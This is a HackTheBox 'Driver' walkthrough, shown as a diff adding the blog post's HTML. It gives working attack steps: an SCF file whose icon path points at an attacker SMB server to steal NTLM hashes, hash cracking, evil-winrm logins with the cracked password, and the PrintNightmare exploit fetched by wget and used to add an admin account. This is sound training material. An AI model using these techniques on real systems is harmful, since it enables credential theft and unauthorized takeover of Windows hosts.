@@ -1,0 +1,88 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">Driver HackTheBox Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/driver-hackthebox-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2022-12-14T20:32:10+00:00">December 14, 2022</time><time class="updated" datetime="2025-06-19T19:57:53+00:00">June 19, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">The driver is an easy-rated Windows box on the HackTheBox platform. This is designed to understand initial exploitation using an SCF file and further escalate privileges locally using PrintNightmare (printer driver vulnerability). The box covers the fundamentals of enumeration and points to attention to detail while pentesting.</span></p>
+<h3><span style="color: #800000;">Table of Content</span></h3>
+<p><span style="color: #000000;"><strong>Initial Access</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Enumeration using Nmap and other tools</span></li>
+<li><span style="color: #000000;">Compromising low-priv hash using SCF file</span></li>
+<li><span style="color: #000000;">Evil-WinRM to access low-priv account</span></li>
+<li><span style="color: #000000;">User Flag</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Abusing printer driver vulnerability</span></li>
+<li><span style="color: #000000;">Root flag</span></li>
+</ul>
+<p><span style="color: #000000;">Let’s deep dive into this.</span></p>
+<h3><span style="color: #800000;">Initial Access</span></h3>
+<p><span style="color: #000000;">The IP address assigned to the machine is 10.129.32.68. Upon running an Nmap scan on this, we get the following result</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhfnLCbTcD0oJ02BSoqk9zHokEpAau71lWylEVZw7RlzVtWKMO9URB3F670Mkyb-WwiEO--UV-kK3si7sZ33cwT2aOaSCklF9VEMyTQ1Snl_bryXPMc2Yujylq-19PgXmPul32W25lDRxrsl7ESsKINLwWbObgKOiaJYeWikY2Ij9ms6_-Lo6VHG1p95A/s16000/1.png"/></span></p>
+<p><span style="color: #000000;">We check each port for enumeration and further access. Only port 80 seemed to have a gateway which could lead further. But it was bound by a password.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg1IfgkDJCWPCJd2xP7LqBZhDygYob2hBeYXHJjsCixGdiCnmKMXjN4K_eB9oEP4sMP-Jgwdxpk2A7c7Y0gcl91pYP3M4vu886BPvLU6PQoG-SOFMds7njLRVKVMyQeiXFtzdSEN6YCezMD3Dna6ZwfqfL1WAq3-2GurUrDlk7HyA2Y9oKWQhy7esiA_g/s16000/2.png"/></span></p>
+<p><span style="color: #000000;">But knowing the password is essential. We see in nmap results that an MFP printer website is running on this port. By operating under the assumption that websites for hardware products generally have a default password set, we try admin/admin and it worked!</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhQWNeSNLGCxlyfrVGJemyTha0ADPfRytW6TZwN3cOJNq5xc1Pzd-hvhMRlMktBLmV98zsCPFqIAPMBqOFhLvpIclwkLm9X96otr74ppFxtQBvuBTv_R7YBaG4zd6KUkRs-pKRmOIVASR7OhIPvnqmEHAJfZrtedwY2SIdkRY2hMg_nTJVT-bIt_Tes5Q/s16000/3.1.png"/></span></p>
+<p><span style="color: #000000;">Further, we see there’s a firmware update option on the website which takes in a file. We looked for firmware files and how shells could be injected into them for execution. A far simpler method came up by which we could inject a Shell Command File (SCF) into the updated portal. You can read more about SCF <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.ibm.com/docs/en/aix/7.1?topic=concepts-creating-running-shell-script">here</a></strong></span>. In Nmap, we see that a Windows server was running so the server could successfully run an SCF file.</span></p>
+<p><span style="color: #000000;">We simply created an SMB server and used a UNC path to access it in order to catch the current running user’s hash.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat shell.scf
+[Shell]
+Command=2
+IconFile=\\10.10.14.93\tools\ignite.ico
+[Taskbar]
+Command=ToggleDesktop</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEivpengmmVEFbebfMlG_XSDqmgJSnOSIm1sY_2MoS7JH2biUD52J0NpALdmSEGp91rLE7u3Xd52HUiz3co21yl6VMsM0dC2C5jbU7ylVSNVeYZ1iMMl7-H0GAa89d_fPv6T-iHP1zod16t5GqzO7BCVjasZqodsdpxjBIeFaRu0MvKxdwpmw3ox_TvYUw/s16000/3.png"/></span></p>
+<p><span style="color: #000000;">Further, we just upload this to the Firmware Updates section.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiwyWZo7mAuPFBlHLmG3MvcCZELGEwZJjFVcHE8SQM4Y_NuOFur11-t8zMVaquJQr3D307gPKtIQlhG82q7DoS0ueHkL9x1sIZuPouyC2Bx4IKJPnOVWWFn0Mu5Na6xnkWj3R_qowtCCTPDJ4s4Zp5RG6ZZJdbCoUHIlr6GVbyoR1HlDWWVIAAW9EPfIw/s16000/3.2.png"/></span></p>
+<p><span style="color: #000000;">Before hitting submit, we launch our smbserver using the impacket tool suite. And then upon hitting submit, we see the Windows server ran the file and we captured a low-priv user tony’s hash.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">smbserver.py tools $(pwd) -smb2support</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgYeeVwIgzdEuLLq6EvK4uaAND6lyZ5RpZ43BiWcSnGj5plfLaHiI-U3q6z86mTotv3XcwWMn-yd-yy9ou3IICWIaycwSM60CevYfkaqAhn5y6CIQCJqg6BC4d6MoBo7aUKnPK3BiRycwspiXJkwnNCYKzaOE3LuH8CCAwPcm89UkYxBqJD8hDPq9Tg1g/s16000/5.png"/></span></p>
+<p><span style="color: #000000;">We save this hash into a file and then run john the ripper using the rockyou dictionary file. We see a cracked credential “liltony”</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjuKPCUMQtqotukioDpRZZFcu5o85o7gtRWm5l6BUG8Uk1f-IZGUI5ied9JaNWa978YS1KZB1StZmZDy9HJL7DPFmYfFlWqtaymMDhxnxB14hrzgFKSs3RRcMPD0sMfrfpQ92i4q1cEDJA4aRvb3rT6d2ePoTaLm_aEEvUxHIyvCrkgScxursek_rPhSA/s16000/6.png"/></span></p>
+<p><span style="color: #000000;">Next, we tried using SMB tools to access the shell to the server but it didn’t work. In Nmap we see WinRM running so we tried evil-winrm to access tony’s account. You can install evil-winrm using gem. Then we access user.txt on Desktop.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">gem install evil-winrm
+evil-winrm -i 10.129.32.68 -u tony -p liltony
+cd ..\Desktop
+cat user.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhw_ZhBoyPp8lK6AmDRpK9FHMie6XYP630K_M3FqXaONwW8sjGM417mBbzvRv1hNTPOdWJ5bOTvh2dDrxIiGXtYPhu0m2v3Tjoab0XSwW9NxthF56S7IHHxww2V3UrFglCtouOgUiSQhETqXlQ5frr-GkhDt7dKOWlwEyQjh-egNMEdc8FRwwsMPniTLA/s16000/7.png"/></span></p>
+<h3><span style="color: #800000;">Privilege Escalation</span></h3>
+<p><span style="color: #000000;">To enumerate further for privilege escalation, we use winPEASx64.exe. We can download this using wget.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">wget https://github.com/carlospolop/peass-ng/releases/download/20221006/winpeasx64.exe</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgvi4oU_yxr59ZtjERx49jWO0lHlPFPZ9yHh1sadB0CTco5KzQxAp3nA7pALBLkA8_VsA-kU1DDThtL8zgMEHcUc0GUHmL7z6xpATG2Px8vWnlhQjn_VvTjm15gxfu40K3UpIufrBJx1F3xkuOFw4Iff4S5pbpiD_0YXSru4BwWLPUjQPBlt7xnC62kBw/s16000/8.png"/></span></p>
+<p><span style="color: #000000;">We can use the upload feature in evil-winrm to put this file on our box and then run it.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">upload /root/winpeasx64.exe
+.\winpeasx64.exe</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhiYdruDzGruDpK_loZHQYostw3OC7wq4EPlwJ0UJeUm7jFhRND-xAFPi9scg1RoE2czqrOiyPR4bQTSWJ8IWnE_3j8VhmeItgxWtqYrkF_PQAm42I7-oxS_2oDMw8lhTMSg6rNFpq-eknou_zInWMC2XPHpzPuwFUvQ_6WLakw43LvXPHigEJ02dDDPw/s16000/9.png"/></span></p>
+<p><span style="color: #000000;">In one of the findings, we see that someone saved and made a powershell history (ConsoleHost_history.txt) file accessible.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiu7ndYOtZ2_5iVU8f1U6dDbowG5yDFobAhmtTYZ4gSHfc57K4goHN6NXfAfsQJgQDiHXg5b7O7cGzl0HmXRpppCJM1qeOgDWGz8vxKSzKa8DDMkME4PlojS11Vx4bVcRlOMKdQE0D-Csk4AbuLfwE7H-QkgRKDL7s6DQt49RJwD114hvRt-052vJfp0A/s16000/10.png"/></span></p>
+<p><span style="color: #000000;">Upon accessing it, we can see that a printer driver for RICOH PCL6 printer was added.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhmZNKkOqqCBGQP-4a3LpZH0tPhZhJ4nEMwuUZZ1VUKFD-qlw8UYS2zi6bLkzKDG9YEk4puKZMmmlV-kjw9WZe3wRb4LneX5oOWu6Ouej1iC2QbWfaBWHNI4CO7n3CkJN7tTUG7ZJUo9TsKpMBZ8tzps4wFOYkhlKvD09usRN6r2B99i_wEORH9Gln97w/s16000/11.png"/></span></p>
+<p><span style="color: #000000;">Reading more about the driver, we found it vulnerable to PrintNightmare vulnerability. You can read more about it <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/JohnHammond/CVE-2021-34527">here</a></strong></span>. So, we download the powershell exploit created by John Hammond.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">wget https://raw.githubusercontent.com/johnhammond/cve-2021-34527/master/cve-2021-34527.ps1</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj4mvaeS3-uHq8GIJbZwQSQgJ64E5JwwAkIbyTeHEUa_kB7aJtvLX_yztb0duNDEoGDYxnujYjxQaNU-JBS2yru41or4TVtXuW27sUP5qlEyLCLMIPNHI6rY2NDt25wqImAPEDcnODuJL5nBeAOFfQJoEJzswQd21CbE3LorQYXCIw6zKCk7Qxtv81S0Q/s16000/12.png"/></span></p>
+<p><span style="color: #000000;">Further, this exploit works by creating a new DLL, adding an admin account to the box and then removing traces. So, we upload this exploit onto the box using evil-winrm and create our own admin account- aarti/Ignite@123987.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
+Import-Module .\CVE-2021-34527.ps1
+Invoke-Nightmare -NewUser "aarti" -NewPassword "Ignite@123987"</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEirb4LXSMvD8xO4v59mo-bE9IalObDjRilSKTO-XgDSLjBFqvHDTQWTcz3F9L2U3PedZbyJsb3lvb2i5inc-SREwH1pqeU2BZb2djOQFcC5Hk0bhG8D-Gh7w987p1X__1L1KY_OqYoklXqsaFTqHaapmXfuV9gYNZYryPY0EhcDro6Hmz9DmHHbhTBsaA/s16000/13.png"/></span></p>
+<p><span style="color: #000000;">We can confirm the exploit’s working by checking the new user’s existence in the server by using the net user command.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">net user
+net user aarti</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjBVvCFpD5cKQcoHReHxeT32U0DVBsM1lLhqDVxQFad_x2mAXM4P8jKADet_sgdfCz8V0h0UDOcqY08rYGbFwIPD4ewmDkMf5iTk5pcZVDELchIDSOjy9C-GG4Npl8PbhQwNSg3KL1aVAONUPu6S2AP0uFbj7PaovjwjwSOlSm5ib9K-o4y_sR8JcK4QQ/s16000/14.png"/></span></p>
+<p><span style="color: #000000;">Finally, we can user evil-winrm again to connect to the machine and snag our root flag.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">evil-winrm -i 10.129.32.68 -u aarti -p ignite@123987
+cd c:\users\administrator\desktop
+cat root.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhBTSvJbePCZrW8abWo5nfcrWaM-ibuDyaEVBHIDXaO-a1DczENm52vD01wEnR0_neMGIHI14OwDRy3y0HBPe7qYo5mgHk2cK_iIVyTzlncQumyHskCswY6bH6t7Mh_hqV0yVgku526PE_B2l9qUFetW56KKhab2H73HLyOeomFJYeurBvTtCewc75WSw/s16000/15.png"/></span></p>
+<h3><span style="color: #800000;">Conclusion</span></h3>
+<p><span style="color: #000000;">Driver box on HackTheBox platform is a good beginner-friendly Windows box that teaches the basics of exploitation using a server-side file execution vulnerability and then privileges escalation using a very famous printer driver vulnerability. Thanks for reading.</span></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. I hope you have enjoyed and learned something new today. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
+<p><span style="color: #000000;"><strong>Author</strong>: Tirut Hawoldar is a Cyber Security Enthusiast and CTF player with 15 years of experience in IT Security and Infrastructure. Can be Contacted on</span> <a href="https://www.linkedin.com/in/tirut-hawoldar-72b67214/"><strong>LinkedIn</strong></a></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
